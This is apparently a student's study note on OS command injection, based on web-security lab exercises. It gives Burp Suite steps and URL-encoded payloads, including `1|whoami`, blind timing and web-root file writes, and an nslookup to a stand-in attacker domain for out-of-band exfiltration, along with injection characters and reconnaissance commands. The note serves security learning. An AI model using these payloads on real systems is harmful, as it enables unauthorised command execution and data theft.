Allow an attacker to execute OS commands on the server. Occurs when a user's input is passed to a shell command without sufficient sanitation.

when checking the  request of functionality of action, look for hidden parameters being used to fetch info. try all the params?

1. Use Burp Suite to intercept and modify a request that checks the stock level.
2. Modify the `storeID` parameter, giving it the value `1|whoami`.
3. Observe that the response contains the ne of the current user.

use command and then forward and check on webpage for return


```
# Passing `echo hello` to the shell
# If this appears in the response, the command injection is successful
https://insecure-website.com/stockStatus?productID=%26%20echo%20hello%20%26

# Blind injection - using timing to determine if the command was successful
# `& ping -c 10 127.0.0.1 &` will take 10 seconds to complete
https://insecure-website.com/stockStatus?productID=%26%20ping%20-c%2010%20127.0.0.1%20%26

# Blind injection - writing to a file in the web root
# `& whoami > /var/www/static/whoami.txt &` and then fetch with https://vulnerable-website.com/whoami.txt
https://vulnerable-website.com/stockStatus?productID=%26%20whoami%20%3E%20%2Fvar%2Fwww%2Fstatic%2Fwhoami.txt%20%26

# Blind injection - DNS query to a malicious DNS server
# `& nslookup kgji2ohoyw.web-attacker.com &` and then check query logs.  DNS can also be used to exfiltrate data.
https://vulnerable-website.com/stockStatus?productID=%26%20nslookup%20kgji2ohoyw.web-attacker.com%20%26

```

Injected commands usually end with `&` to prevent subsequent commands from stopping the injected command from running.


## Injection characters

The following can all be uesd to inject commands:
```
&
&&
|
||
;
Newline (0x0a or \n)

# Bash specific
`
$(
```

## Useful commands

Purpose of command 	Linux 	Windows
ne of current user 	whoami 	   whoami
Operating system 	        une -a 	  ver
Network configuration 	ifconfig 	       ipconfig /all
Network connections 	netstat -an 	netstat -an
Running processes                ps -ef 	     tasklist 